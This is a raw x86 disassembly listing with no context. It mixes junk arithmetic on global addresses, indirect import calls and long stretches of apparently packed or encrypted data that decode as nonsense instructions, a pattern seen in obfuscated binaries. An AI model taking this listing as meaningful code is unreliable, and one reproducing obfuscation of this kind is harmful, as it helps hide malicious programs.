  402c2e:	mov    DWORD PTR ds:0x428481,edx
  402c34:	cmp    DWORD PTR ds:0x428341,0x0
  402c3b:	jl     0x402c5f
  402c41:	push   DWORD PTR [ebp-0x18]
  402c44:	push   0x2a6e
  402c49:	call   DWORD PTR ds:0x42e240
  402c4f:	sbb    DWORD PTR ds:0x428341,0x59bd
  402c59:	sub    edx,0x641d
  402c5f:	sbb    DWORD PTR ds:0x428349,0x428501
  402c69:	sbb    DWORD PTR ds:0x4284e5,0x27b0
  402c73:	mov    edx,DWORD PTR ds:0x4284ad
  402c79:	mov    edx,DWORD PTR [edx]
  402c7b:	adc    DWORD PTR ds:0x428405,edx
  402c81:	xor    DWORD PTR ds:0x428455,0x428421
  402c8b:	sbb    DWORD PTR ds:0x428471,0x33ea
  402c95:	shr    eax,0x2
  402c98:	cmp    DWORD PTR ds:0x428445,0x0
  402c9f:	mov    DWORD PTR ds:0x428561,0x384
  402ca9:	mov    DWORD PTR ds:0x428345,0x2b95
  402cb3:	mov    edx,DWORD PTR ds:0x428549
  402cb9:	mov    DWORD PTR ds:0x428501,edx
  402cbf:	jmp    0x402d0e
  402cc4:	mov    eax,0x220e
  402cc9:	mov    DWORD PTR ds:0x4284ed,0x7b53
  402cd3:	cmp    DWORD PTR ds:0x428445,0x0
  402cda:	jbe    0x402d06
  402ce0:	push   0x3c7e
  402ce5:	push   0x1ff0
  402cea:	call   DWORD PTR ds:0x42e0b0
  402cf0:	sub    edx,0x6132
  402cf6:	sbb    DWORD PTR ds:0x428501,0x612a
  402d00:	sbb    DWORD PTR ds:0x428565,ecx
  402d06:	dec    edx
  402d07:	inc    edx
  402d08:	and    edx,DWORD PTR ds:0x428565
  402d0e:	mov    eax,DWORD PTR [ebx]
  402d10:	mov    edx,DWORD PTR [ebx+0x4]
  402d13:	dec    DWORD PTR ds:0x428405
  402d19:	xor    ecx,edi
  402d1b:	shl    eax,0x1e
  402d1e:	xor    edx,0x1700
  402d24:	xor    eax,eax
  402d26:	sub    edx,0x11fc
  402d2c:	or     eax,ecx
  402d2e:	mov    ecx,DWORD PTR [ebx]
  402d30:	cmp    DWORD PTR ds:0x428501,0x0
  402d37:	mov    DWORD PTR ds:0x428469,0x400c
  402d41:	mov    edx,DWORD PTR ds:0x42842d
  402d47:	mov    edx,DWORD PTR ds:0x4284fd
  402d4d:	jmp    0x402d9d
  402d52:	mov    DWORD PTR ds:0x428451,0x114
  402d5c:	cmp    DWORD PTR ds:0x428501,0x0
  402d63:	je     0x402d85
  402d69:	push   DWORD PTR [ebp-0x24]
  402d6c:	call   DWORD PTR ds:0x42e0b4
  402d72:	dec    edx
  402d73:	xor    edx,DWORD PTR ds:0x428559
  402d79:	or     DWORD PTR ds:0x428439,ebx
  402d7f:	sub    DWORD PTR ds:0x4284fd,ecx
  402d85:	mov    edx,DWORD PTR ds:0x42854d
  402d8b:	xor    DWORD PTR ds:0x4284ed,edx
  402d91:	xor    edx,0x442c
  402d97:	not    DWORD PTR ds:0x42833d
  402d9d:	mov    edx,DWORD PTR [ebx+0x4]
  402da0:	add    DWORD PTR ds:0x428439,0x428419
  402daa:	shrd   ecx,edx,0x2
  402dae:	shr    edx,0x2
  402db1:	mov    DWORD PTR [ebp-0x1c],ecx
  402db4:	sbb    edx,DWORD PTR ds:0x428501
  402dba:	mov    ecx,DWORD PTR [ebx]
  402dbc:	mov    edx,DWORD PTR ds:0x428481
  402dc2:	xor    DWORD PTR ds:0x4284ed,edx
  402dc8:	mov    edx,DWORD PTR [ebx+0x4]
  402dcb:	xor    DWORD PTR [ebp-0x1c],edi
  402dce:	and    DWORD PTR ds:0x428471,0x4abe
  402dd8:	xor    edx,edx
  402dda:	sub    DWORD PTR ds:0x428411,0x1446
  402de4:	or     edx,DWORD PTR [ebp-0x1c]
  402de7:	shl    ecx,0x1e
  402dea:	lea    ecx,[edx+eax*1]
  402ded:	mov    edx,DWORD PTR ds:0x42852d
  402df3:	xor    eax,eax
  402df5:	xor    eax,DWORD PTR ds:0x4285b9
  402dfb:	sub    edx,eax
  402dfd:	add    edx,DWORD PTR [edx+eax*1]
  402e00:	mov    eax,DWORD PTR [ebx]
  402e02:	xor    DWORD PTR ds:0x428571,ecx
  402e08:	mov    edx,DWORD PTR [ebx+0x4]
  402e0b:	or     DWORD PTR ds:0x42840d,0x3bc
  402e15:	shrd   eax,edx,0x2
  402e19:	shr    edx,0x2
  402e1c:	cmp    DWORD PTR ds:0x42857d,0x0
  402e23:	mov    DWORD PTR ds:0x42846d,ebx
  402e29:	mov    DWORD PTR ds:0x428471,0x656f
  402e33:	movzx  edx,BYTE PTR ds:0x428419
  402e3a:	jmp    0x402e93
  402e3f:	mov    DWORD PTR ds:0x42843d,0x5c7
  402e49:	mov    DWORD PTR ds:0x42847d,0x3013
  402e53:	cmp    DWORD PTR ds:0x42857d,0x0
  402e5a:	jle    0x402e7f
  402e60:	push   DWORD PTR [ebp-0x24]
  402e63:	call   DWORD PTR ds:0x42e0b8
  402e69:	sub    DWORD PTR ds:0x428351,0x7db0
  402e73:	sub    DWORD PTR ds:0x428581,ecx
  402e79:	adc    DWORD PTR ds:0x42840d,edx
  402e7f:	and    edx,DWORD PTR ds:0x4284e9
  402e85:	mov    edx,DWORD PTR ds:0x42839d
  402e8b:	mov    edx,DWORD PTR [edx]
  402e8d:	xor    DWORD PTR ds:0x42836d,edx
  402e93:	mov    DWORD PTR [ebp-0x1c],eax
  402e96:	not    DWORD PTR ds:0x428451
  402e9c:	mov    eax,DWORD PTR [ebx]
  402e9e:	add    DWORD PTR ds:0x4284e9,0x4968
  402ea8:	jmp    0x403249
  402ead:	cmp    al,0xdc
  402eaf:	(bad)  
  402eb0:	inc    ebp
  402eb1:	ss dec ebx
  402eb3:	mov    esp,0x8c100abc
  402eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eb9:	(bad)  
  402eba:	aas    
  402ebb:	mov    WORD PTR [ebp+edi*4-0x42414120],fs
  402ec2:	les    edi,FWORD PTR [esi-0xb0b0742]
  402ec8:	xchg   ecx,eax
  402ec9:	cmp    BYTE PTR [edi+eax*2],ch
  402ecc:	into   
  402ecd:	inc    esp
  402ece:	ja     0x402f04
  402ed0:	je     0x402ee0
  402ed2:	adc    edi,DWORD PTR [eax]
  402ed4:	in     eax,0xb7
  402ed6:	cdq    
  402ed7:	cld    
  402ed8:	fdivr  QWORD PTR [edi-0x67]
  402edb:	xor    DWORD PTR [edi+0x1],0x77
  402edf:	ret    
  402ee0:	mov    esp,0xbf4a0831
  402ee5:	mov    ch,0xde
  402ee7:	dec    esp
  402ee8:	cmp    DWORD PTR [eax+edi*4],edx
  402eeb:	cwde   
  402eec:	dec    ebp
  402eed:	in     al,dx
  402eee:	imul   esp,DWORD PTR [edx+edi*4+0x1a],0x23
  402ef3:	dec    esi
  402ef4:	aad    0xd4
  402ef6:	aaa    
  402ef7:	mov    bh,0xde
  402ef9:	cdq    
  402efa:	mov    bl,0xaf
  402efc:	hlt    
  402efd:	dec    eax
  402efe:	cli    
  402eff:	adc    eax,DWORD PTR ds:0x665d48cf
  402f05:	dec    esp
  402f06:	retf   
  402f07:	mov    ds:0x133242f5,ax
  402f0d:	push   esi
  402f0e:	fidiv  DWORD PTR [eax-0x17]
  402f11:	scas   eax,DWORD PTR es:[edi]
  402f12:	push   ecx
  402f13:	hlt    
  402f14:	inc    ebp
  402f15:	sub    eax,0xed3d18c9
  402f1a:	push   ds
  402f1b:	sar    BYTE PTR [ebx-0x6c36e9c4],0xab
  402f22:	test   al,0xa9
  402f24:	fcmovnb st,st(7)
  402f26:	popf   
  402f27:	retf   0xd02d
  402f2a:	xor    BYTE PTR [edx+0x4e],dh
  402f2d:	imul   edx,ebx,0x11
  402f30:	xlat   BYTE PTR ds:[ebx]
  402f31:	sub    eax,0x94ab8d98
  402f36:	jnp    0x402f01
  402f38:	stos   BYTE PTR es:[edi],al
  402f39:	(bad)  
  402f3a:	bound  edx,QWORD PTR [esi]
  402f3c:	inc    esi
  402f3d:	mov    ecx,0x4e52a3bb
  402f42:	ret    
  402f43:	add    al,0xb3
  402f45:	mov    ah,0xb3
  402f47:	jg     0x402f63
  402f49:	call   0xfdc2:0xa524fe44
  402f50:	xchg   ebx,eax
  402f51:	and    BYTE PTR [ecx],dl
  402f53:	(bad)  
  402f54:	mov    eax,0x17519f91
  402f59:	and    DWORD PTR [ebp-0x6c7f29ce],esi
  402f5f:	wbinvd 
  402f61:	shr    DWORD PTR [edx+ebx*4+0x1e],0x6b
  402f66:	rcr    DWORD PTR [edi+edi*2+0x3788ddd1],0xbc
  402f6e:	ror    edx,0xc1
  402f71:	pop    ebx
  402f72:	(bad)  
  402f73:	xchg   esp,eax
  402f74:	cli    
  402f75:	adc    eax,0xab2682e4
  402f7a:	(bad)  
  402f7b:	mov    esi,0xe90be08d
  402f80:	lahf   
  402f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f82:	or     al,0x6c
  402f84:	jae    0x402f22
  402f86:	push   esi
  402f87:	(bad)  
  402f88:	std    
  402f89:	jle    0x402fd8
  402f8b:	or     WORD PTR [edx+edi*8+0x36],dx
  402f90:	pop    ss
  402f91:	xor    al,0xcb
  402f93:	cwde   
  402f94:	retf   
  402f95:	fnstcw WORD PTR [ebp-0x1b]
  402f98:	scas   eax,DWORD PTR es:[edi]
  402f99:	xlat   BYTE PTR ds:[ebx]
  402f9a:	fimul  DWORD PTR [eax]
  402f9c:	sub    edx,ebx
  402f9e:	mov    dh,0xb9
  402fa0:	ror    dh,1
  402fa2:	mov    ah,ah
  402fa4:	push   cs
  402fa5:	arpl   WORD PTR [edi-0x20],ax
  402fa8:	test   BYTE PTR [esi-0x4567e0d6],ch
  402fae:	in     eax,dx
  402faf:	rcl    DWORD PTR [edx+0x6dec4327],1
  402fb5:	test   BYTE PTR [esp+ebp*8],bl
  402fb8:	(bad)  
  402fb9:	loop   0x402fd0
  402fbb:	or     al,0x75
  402fbd:	jnp    0x40303c
  402fbf:	xor    eax,0xd4e81879
  402fc4:	inc    esi
  402fc5:	and    bl,bh
  402fc7:	pinsrw mm1,WORD PTR [eax],0x0
  402fcb:	or     al,0x1d
  402fcd:	dec    esi
  402fce:	pop    ds
  402fcf:	sbb    esp,DWORD PTR [edx]
  402fd1:	test   BYTE PTR [ebx+0x14],bh
  402fd4:	mov    edx,0xa9adb814
  402fd9:	fs adc eax,0x65
  402fdd:	dec    edi
  402fde:	push   ecx
  402fdf:	xchg   ebx,eax
  402fe0:	call   DWORD PTR [ecx-0x1d]
  402fe3:	frstor [edx]
  402fe5:	pop    ebp
  402fe6:	stos   DWORD PTR es:[edi],eax
  402fe7:	pop    fs
  402fe9:	dec    edi
  402fea:	xchg   bh,bh
  402fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fed:	lock inc edx
  402fef:	in     eax,0x5b
  402ff1:	mov    edi,0xe111f3a0
  402ff6:	and    ch,BYTE PTR [ecx]
  402ff8:	xchg   edx,eax
  402ff9:	pop    edx
  402ffa:	jns    0x40306f
  402ffc:	shr    DWORD PTR [edi-0x16],1
  402fff:	fcom   DWORD PTR [edx+0x58b471da]
  403005:	aas    
  403006:	sub    DWORD PTR ds:0x839536ff,esp
  40300c:	inc    ebx
  40300d:	adc    edi,ecx
  40300f:	jae    0x40308c
  403011:	xor    DWORD PTR [esi+0x69],edx
  403014:	jge    0x402faf
  403016:	int    0x10
  403018:	int3   
  403019:	and    eax,0x1e99ad5
  40301e:	ret    0xc526
  403021:	pcmpgtd mm0,QWORD PTR [edi+0x2b]
  403025:	jne    0x402fda
  403027:	iret   
  403028:	shl    BYTE PTR [ebp+0x77],1
  40302b:	xor    eax,0x7312f3d7
  403030:	lahf   
  403031:	packssdw mm6,QWORD PTR [eax+edx*8-0x4]
  403036:	jmp    0x402fdc
  403038:	xchg   ebx,eax
  403039:	inc    ecx
  40303a:	ins    BYTE PTR es:[edi],dx
  40303b:	xor    DWORD PTR [edx+0x278264d4],0x73bd0bc8
  403045:	mov    ecx,0xa3410083
  40304a:	cdq    
  40304b:	adc    edx,DWORD PTR [eax+0x673e2e99]
  403051:	mov    BYTE PTR [ecx-0x3cd626a6],al
  403057:	aaa    
  403058:	push   ds
  403059:	cmp    BYTE PTR [edx-0x6ae32287],dl
  40305f:	lods   eax,DWORD PTR ds:[esi]
  403060:	xchg   ebx,eax
  403061:	push   ss
  403062:	add    ebp,DWORD PTR [ecx]
  403064:	shr    BYTE PTR [ebx+0x62402d8e],0x65
  40306b:	sbb    eax,0xe02907a2
  403070:	popf   
  403071:	test   BYTE PTR [esp+ebp*8+0x408ff62d],dh
  403078:	(bad)  [edx+0x149bf00f]
  40307e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40307f:	ficomp WORD PTR [eax]
  403081:	in     eax,0x27
  403083:	fcmovnbe st,st(0)
  403085:	inc    esp
  403086:	neg    esp
  403088:	inc    ebx
  403089:	xchg   BYTE PTR [esi],dh
  40308b:	enter  0x2fe3,0xda
  40308f:	fbstp  TBYTE PTR [ebp+esi*1+0x22]
  403093:	xchg   ebp,eax
  403094:	je     0x4030c0
  403096:	or     edi,ecx
  403098:	cmp    ch,BYTE PTR [eax-0x5a918eaa]
  40309e:	adc    esi,eax
  4030a0:	lods   al,BYTE PTR ds:[esi]
  4030a1:	jmp    0x4030a3
  4030a3:	xchg   cl,al
  4030a5:	xchg   BYTE PTR [edi+0x286face2],dl
  4030ab:	cdq    
  4030ac:	and    al,0x9e
  4030ae:	xor    eax,DWORD PTR [ebp-0x752698cd]
  4030b4:	lds    edx,FWORD PTR [eax-0x203a8e48]
  4030ba:	(bad)  
  4030bb:	leave  
  4030bc:	mov    DWORD PTR [esi],ecx
  4030be:	lea    ecx,[esi-0x61]
  4030c1:	push   esp
  4030c2:	lahf   
  4030c3:	or     esp,DWORD PTR [edi]
  4030c5:	dec    esp
  4030c6:	lods   eax,DWORD PTR ds:[esi]
  4030c7:	int    0x53
  4030c9:	call   0x603f:0xdb93f9c1
  4030d0:	jp     0x403069
  4030d2:	inc    edi
  4030d3:	retf   
  4030d4:	push   ecx
  4030d5:	and    edi,DWORD PTR [ecx-0x38bef055]
  4030db:	inc    esp
  4030dc:	daa    
  4030dd:	mov    al,ds:0x52dd84af
  4030e2:	mov    esp,0x3cd6dd2d
  4030e7:	add    eax,0x11fb0b6e
  4030ec:	jbe    0x403101
  4030ee:	call   0x3da4:0x76a91f58
  4030f5:	and    DWORD PTR [ecx+0xb02bab5],0xe3ff7100
  4030ff:	xlat   BYTE PTR ds:[ebx]
  403100:	mov    al,0xeb
  403102:	mov    DWORD PTR [ecx+ebx*2],edi
  403105:	bound  edx,QWORD PTR [edx+0x67af4203]
  40310b:	xchg   ecx,eax
  40310c:	dec    BYTE PTR [edi+0xc0d735a]
  403112:	aad    0xf7
  403114:	inc    ecx
  403115:	xchg   edx,eax
  403116:	jecxz  0x40310a
  403118:	mov    ch,0xc9
  40311a:	push   es
  40311b:	into   
  40311c:	xor    cl,BYTE PTR [edx]
  40311e:	inc    esp
  40311f:	inc    edi
  403120:	jo     0x403111
  403122:	clc    
  403123:	cli    
  403124:	cmp    DWORD PTR [ebx+edx*4+0x1],esi
  403128:	into   
  403129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40312a:	xlat   BYTE PTR ds:[ebx]
  40312b:	mov    DWORD PTR [edi-0xc],ebx
  40312e:	sbb    edi,DWORD PTR [esi]
  403130:	mov    DWORD PTR [esi+0x14],esp
  403133:	dec    edi
  403134:	inc    edi
  403135:	xchg   BYTE PTR [ecx],al
  403137:	sbb    esp,ebx
  403139:	mov    bl,0x90
  40313b:	pusha  
  40313c:	fs pop edi
  40313e:	dec    ecx
  40313f:	mov    dl,BYTE PTR [ebx-0x59]
  403142:	xchg   ebp,eax
  403143:	mov    bl,0x1e
  403145:	xor    cl,BYTE PTR [edi+0x20d470ca]
  40314b:	mov    ss,WORD PTR [ecx-0x2b]
  40314e:	fdiv   QWORD PTR [ebp+0x50]
  403151:	cmp    DWORD PTR gs:[ecx+0x5a],esp
  403155:	sbb    esp,edx
  403157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403158:	adc    ecx,ecx
  40315a:	push   ebx
  40315b:	and    al,0x98
  40315d:	xor    ch,BYTE PTR [edi*8-0x27b6d4a6]
  403164:	leave  
  403165:	push   eax
  403166:	imul   ecx,DWORD PTR [edx-0xbeaf955],0x6a
  40316d:	push   esp
  40316e:	into   
  40316f:	push   ss
  403170:	jp     0x403120
  403172:	in     eax,dx
  403173:	in     al,0x78
  403175:	addr16 ret 
  403177:	in     al,0xdc
  403179:	fs dec esp
  40317b:	pusha  
  40317c:	add    eax,0xf862947e
  403181:	inc    esi
  403182:	out    dx,eax
  403183:	mov    dl,0x86
  403185:	cwde   
  403186:	imul   esp,edi,0x3b4441e4
  40318c:	xor    al,0x7a
  40318e:	std    
  40318f:	es add eax,0x2d8d1c87
  403195:	cmc    
  403196:	and    DWORD PTR [esi],ebx
  403198:	xor    BYTE PTR [ecx],bh
  40319a:	adc    eax,0x75ccaff
  40319f:	sub    BYTE PTR [eax+0x3c],dh
  4031a2:	(bad)  
  4031a3:	and    esp,DWORD PTR [ebp-0x1e057082]
  4031a9:	(bad)  
  4031aa:	imul   BYTE PTR [ebp-0x55]
  4031ad:	lods   eax,DWORD PTR ds:[esi]
  4031ae:	aad    0x62
  4031b0:	or     DWORD PTR [edi-0x4ba02160],0xffffffd5
  4031b7:	sbb    edx,esi
  4031b9:	scas   eax,DWORD PTR es:[edi]
  4031ba:	stc    
  4031bb:	repz sub al,0x40
  4031be:	popf   
  4031bf:	fcmovnu st,st(1)
  4031c1:	jo     0x40320b
  4031c3:	sbb    DWORD PTR [edi+0x27d3d086],eax
  4031c9:	lahf   
  4031ca:	icebp  
  4031cb:	fldl2t 
  4031cd:	movntps XMMWORD PTR [ebp-0x3ff00651],xmm1
  4031d4:	mov    gs,esi
  4031d6:	xchg   ebx,eax
  4031d8:	pop    ss
  4031d9:	mov    ebp,DWORD PTR [edi+eiz*8-0x1]
  4031dd:	dec    esi
  4031de:	xchg   ebp,eax
  4031df:	mov    esp,0x701e7f63
  4031e4:	arpl   WORD PTR [ecx],bp
  4031e6:	inc    ebx
  4031e7:	(bad)  
  4031e8:	in     eax,0xad
  4031ea:	cwde   
  4031eb:	cli    
  4031ec:	sbb    al,0xa7
  4031ee:	inc    edx
  4031ef:	push   0xffffffcb
  4031f1:	cdq    
  4031f2:	not    BYTE PTR [esi-0x32]
  4031f5:	mov    dl,0xc0
  4031f7:	jne    0x40322f
  4031f9:	shr    eax,cl
  4031fb:	cmp    esp,DWORD PTR [ebp-0x71]
  4031fe:	out    dx,eax
  4031ff:	dec    ebp
  403200:	dec    ebp
  403201:	gs (bad) 
  403204:	(bad)  
  403205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403206:	shl    bh,0x19
  403209:	jg     0x4031c8
  40320b:	call   0x273:0xa7f2d578
  403212:	jmp    0x75bb789d
  403217:	mov    ds:0xd31a4113,eax
  40321c:	call   0x1719fb39
  403221:	mov    eax,ds:0x9f59db0
  403226:	sbb    eax,0xe5bdd564
  40322b:	int    0x73
  40322d:	adc    bh,0x17
  403230:	mov    al,0x71
  403232:	and    dh,0x55
  403235:	push   ebx
  403236:	push   0xffffffcd
  403238:	leave  
  403239:	mov    bh,BYTE PTR [edx]
  40323b:	into   
  40323c:	retf   0x452d
  40323f:	lds    ebx,FWORD PTR [ebp-0x76eaef7a]
  403245:	cmp    al,0x68
  403247:	test   al,0xa4
  403249:	mov    edx,DWORD PTR [ebx+0x4]
  40324c:	xor    DWORD PTR [ebp-0x1c],edi
  40324f:	sub    DWORD PTR ds:0x4284d9,ebx
  403255:	mov    edx,eax
  403257:	sub    DWORD PTR ds:0x428579,0x42835d
  403261:	xor    eax,eax
  403263:	or     eax,DWORD PTR [ebp-0x1c]
  403266:	shl    edx,0x1e
  403269:	mov    edx,DWORD PTR ds:0x428459
  40326f:	xor    DWORD PTR ds:0x42840d,edx
  403275:	imul   eax,ecx
  403278:	sub    DWORD PTR ds:0x4284f9,0x4172
  403282:	mov    ecx,DWORD PTR [ebx]
  403284:	add    edx,0x41d1
  40328a:	mov    edx,DWORD PTR [ebx+0x4]
  40328d:	shrd   ecx,edx,0x2
  403291:	mov    DWORD PTR [ebp-0x1c],ecx
  403294:	mov    ecx,DWORD PTR [ebx]
  403296:	or     DWORD PTR ds:0x4284c9,0x42b9
  4032a0:	xor    DWORD PTR [ebp-0x1c],edi
  4032a3:	mov    DWORD PTR ds:0x428555,0x397a
  4032ad:	shr    edx,0x2
  4032b0:	cmp    DWORD PTR ds:0x42855d,0x0
  4032b7:	mov    DWORD PTR ds:0x4284f1,0x7cee
  4032c1:	mov    edx,DWORD PTR ds:0x428405
  4032c7:	jmp    0x403370
  4032cc:	mov    DWORD PTR ds:0x42835d,0x3170
  4032d6:	cmp    DWORD PTR ds:0x42855d,0x0
  4032dd:	jge    0x403302
  4032e3:	push   DWORD PTR [ebp-0x28]
  4032e6:	call   DWORD PTR ds:0x42e244
  4032ec:	add    edx,DWORD PTR ds:0x42841d
  4032f2:	sub    edx,0x765a
  4032f8:	xor    DWORD PTR ds:0x4284d5,0x290
  403302:	sbb    DWORD PTR ds:0x428411,edi
  403308:	inc    edx
  403309:	not    edx
  40330b:	cmp    DWORD PTR ds:0x4284f1,0x0
  403312:	mov    edx,DWORD PTR ds:0x428431
  403318:	mov    DWORD PTR ds:0x4284cd,0x501f
  403322:	mov    edx,DWORD PTR ds:0x4284d1
  403328:	jmp    0x403370
  40332d:	mov    DWORD PTR ds:0x428375,0x1634
  403337:	mov    DWORD PTR ds:0x4284e9,0xaef
  403341:	cmp    DWORD PTR ds:0x4284f1,0x0
  403348:	jb     0x403364
  40334e:	call   DWORD PTR ds:0x42e0bc
  403354:	adc    DWORD PTR ds:0x428431,0x42847d
  40335e:	adc    edx,0x2d88
  403364:	and    edx,0x4ab7
  40336a:	sub    edx,DWORD PTR ds:0x428411
  403370:	mov    edx,DWORD PTR [ebx+0x4]
  403373:	or     edx,DWORD PTR ds:0x4284e9
  403379:	mov    edx,ecx
  40337b:	add    DWORD PTR ds:0x428365,0x4284d9
  403385:	xor    ecx,ecx
  403387:	adc    DWORD PTR ds:0x428335,0x428455
  403391:	or     ecx,DWORD PTR [ebp-0x1c]
  403394:	sub    DWORD PTR ds:0x42844d,0x6b10
  40339e:	shl    edx,0x1e
  4033a1:	add    DWORD PTR ds:0x42833d,ebx
  4033a7:	sub    ecx,eax
  4033a9:	mov    DWORD PTR ds:0x428409,0x9e0
  4033b3:	mov    eax,DWORD PTR [ebp-0xc]
  4033b6:	cmp    DWORD PTR [eax],ecx
  4033b8:	mov    DWORD PTR ds:0x428569,0x2658
  4033c2:	mov    eax,DWORD PTR [ebp-0xc]
  4033c5:	mov    ecx,DWORD PTR [ebp+0x18]
  4033c8:	mov    edx,DWORD PTR ds:0x428361
  4033ce:	mov    edx,DWORD PTR [ebp+0x1c]
  4033d1:	jg     0x4038e5
  4033d7:	and    DWORD PTR ds:0x428571,0xf14
  4033e1:	shrd   ecx,edx,0x2
  4033e5:	xor    DWORD PTR ds:0x428439,0x428431
  4033ef:	mov    DWORD PTR [ebp-0x1c],ecx
  4033f2:	xor    DWORD PTR ds:0x428365,edi
  4033f8:	mov    ecx,DWORD PTR [ebp+0x18]
  4033fb:	xor    DWORD PTR [ebp-0x1c],edi
  4033fe:	shl    ecx,0x1e
  403401:	mov    DWORD PTR ds:0x428415,0x71ad
  40340b:	xor    ecx,ecx
  40340d:	or     ecx,DWORD PTR [ebp-0x1c]
  403410:	shr    edx,0x2
  403413:	sub    DWORD PTR ds:0x4284fd,0x3b82
  40341d:	mov    edx,DWORD PTR [ebp+0x1c]
  403420:	cmp    DWORD PTR ds:0x4284d1,0x0
  403427:	mov    DWORD PTR ds:0x428561,0xe2a
  403431:	mov    DWORD PTR ds:0x428349,ecx
  403437:	mov    edx,0x4d53
  40343c:	jmp    0x4034b7
  403441:	mov    DWORD PTR ds:0x428575,0xfd5
  40344b:	mov    DWORD PTR ds:0x428449,ecx
  403451:	cmp    DWORD PTR ds:0x4284d1,0x0
  403458:	jae    0x4034a5
  40345e:	push   DWORD PTR [ebp-0x1c]
  403461:	push   0x633e
  403466:	push   0x428267
  40346b:	push   DWORD PTR [ebp-0x1c]
  40346e:	push   DWORD PTR [ebp-0xc]
  403471:	push   DWORD PTR [ebp-0x20]
  403474:	push   DWORD PTR [ebp-0x24]
  403477:	push   0x6c89
  40347c:	call   DWORD PTR ds:0x42dff4
  403482:	movzx  edx,WORD PTR ds:0x42842d
  403489:	sub    edx,DWORD PTR ds:0x4284e5
  40348f:	mov    DWORD PTR ds:0x42842d,edx
  403495:	mov    DWORD PTR ds:0x428361,0x6c8
  40349f:	sbb    edx,DWORD PTR ds:0x42836d
  4034a5:	mov    edx,DWORD PTR ds:0x42857d
  4034ab:	and    DWORD PTR ds:0x428435,edx
  4034b1:	inc    DWORD PTR ds:0x42832d
  4034b7:	mov    DWORD PTR [ebp-0x2c],ecx
  4034ba:	xor    DWORD PTR ds:0x428345,0x3285
  4034c4:	mov    ecx,DWORD PTR [ebx]
  4034c6:	mov    edx,DWORD PTR [ebx+0x4]
  4034c9:	and    DWORD PTR ds:0x428549,0x4bb1
  4034d3:	shrd   ecx,edx,0x2
  4034d7:	mov    DWORD PTR ds:0x428429,0x325c
  4034e1:	shr    edx,0x2
  4034e4:	add    DWORD PTR ds:0x4284e1,0x68a9
  4034ee:	mov    DWORD PTR [ebp-0x1c],ecx
  4034f1:	sub    DWORD PTR ds:0x428481,ebx
  4034f7:	mov    ecx,DWORD PTR [ebx]
  4034f9:	sub    DWORD PTR ds:0x428469,0x4284ed
  403503:	mov    edx,DWORD PTR [ebx+0x4]
  403506:	xor    DWORD PTR [ebp-0x1c],edi
  403509:	sub    DWORD PTR ds:0x428349,0x428361
  403513:	xor    edx,edx
  403515:	or     edx,DWORD PTR [ebp-0x1c]
  403518:	add    DWORD PTR ds:0x428341,0x71c0
  403522:	shl    ecx,0x1e
  403525:	adc    DWORD PTR ds:0x4284f1,0x428471
  40352f:	imul   edx,DWORD PTR [ebp-0x2c]
  403533:	and    DWORD PTR ds:0x42844d,0x15cd
  40353d:	sub    DWORD PTR [eax],edx
  40353f:	jmp    0x4041b5
  403544:	jmp    0x4038e5
  403549:	pop    ss
  40354a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354b:	out    0xaf,eax
  40354d:	js     0x4034ff
  40354f:	cwde   
  403550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403551:	retf   
  403552:	mov    ch,0x34
  403554:	fucomp st(5)
  403556:	fist   WORD PTR [eax-0x41174170]
  40355c:	mov    esi,0xbebec4bd
  403561:	pop    eax
  403562:	je     0x403562
  403564:	ret    0xb1f8
  403567:	(bad)  
  403568:	fwait
  403569:	pusha  
  40356a:	mov    ah,0x58
  40356c:	pop    esp
  40356d:	lds    esp,FWORD PTR [ebx]
  40356f:	(bad)  
  403570:	xlat   BYTE PTR ds:[ebx]
  403571:	psubd  mm1,mm5
  403574:	pusha  
  403575:	adc    ebp,DWORD PTR [ebx-0x3ff5157f]
  40357b:	add    eax,0xde2354cf
  403580:	icebp  
  403581:	xchg   esi,eax
  403582:	jmp    0xdded:0x29b7274d
  403589:	mov    esi,0x336ab49e
  40358e:	adc    ebp,edi
  403590:	imul   esi,DWORD PTR [edx+0x50],0x31e2789a
  403597:	jge    0x403532
  403599:	xor    dl,BYTE PTR ds:0x8f1029fd
  40359f:	daa    
  4035a0:	rcr    DWORD PTR [edi],cl
  4035a2:	push   0x18
  4035a4:	int3   
  4035a5:	leave  
  4035a6:	sub    DWORD PTR [edi+0x7119900d],ebx
  4035ac:	pop    edi
  4035ad:	adc    eax,0x8ea6bf68
  4035b2:	dec    eax
  4035b3:	mov    dl,0x76
  4035b5:	sub    DWORD PTR [edx+0x2f4bb725],ecx
  4035bb:	inc    ebx
  4035bc:	sti    
  4035bd:	fsub   st(6),st
  4035bf:	xchg   edx,eax
  4035c0:	add    eax,edi
  4035c2:	mov    dh,0x8d
  4035c4:	(bad)  
  4035c5:	int    0xf0
  4035c7:	pop    eax
  4035c8:	loope  0x40355e
  4035ca:	dec    BYTE PTR [esp+eiz*8]
  4035cd:	lahf   
  4035ce:	test   al,0x4b
  4035d0:	push   esi
  4035d1:	jle    0x403564
  4035d3:	sahf   
  4035d4:	in     eax,dx
  4035d5:	fucom  st(6)
  4035d7:	(bad)  
  4035d8:	iret   
  4035d9:	gs pop ss
  4035db:	cmp    dl,BYTE PTR [ebp-0x5db33faf]
  4035e1:	inc    ebp
  4035e2:	and    dl,BYTE PTR [ebx+0x3dcfd30e]
  4035e8:	sti    
  4035e9:	imul   ecx,DWORD PTR [esp+ebp*8+0x458f58f3],0x37
  4035f1:	lock retf 0x2b84
  4035f5:	(bad)  
  4035f6:	fist   DWORD PTR [edx+0x1d1ebdc7]
  4035fc:	and    eax,eax
  4035fe:	add    dl,bl
  403600:	dec    ebx
  403601:	repz (bad) 
  403603:	sub    DWORD PTR [ecx+0x77],ebx
  403606:	mov    DWORD PTR [eax],esp
  403608:	jl     0x403628
  40360a:	add    bl,dl
  40360c:	fmul   DWORD PTR [eax+0x7bd6a85e]
  403612:	cmp    DWORD PTR [ebx+0x47e5ade8],ecx
  403618:	or     esp,esi
  40361a:	fld    DWORD PTR [eax+0xe]
  40361d:	xor    al,0xda
  40361f:	ins    BYTE PTR es:[edi],dx
  403620:	inc    ebx
  403621:	mov    ds:0xb8f39071,eax
